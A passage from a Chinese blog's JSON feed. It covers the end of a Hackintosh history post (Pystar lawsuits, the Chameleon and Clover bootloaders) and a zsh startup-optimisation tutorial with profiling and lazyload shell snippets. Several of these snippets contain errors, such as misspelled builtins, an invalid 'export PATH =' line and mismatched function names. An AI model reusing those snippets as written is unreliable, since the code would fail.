公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 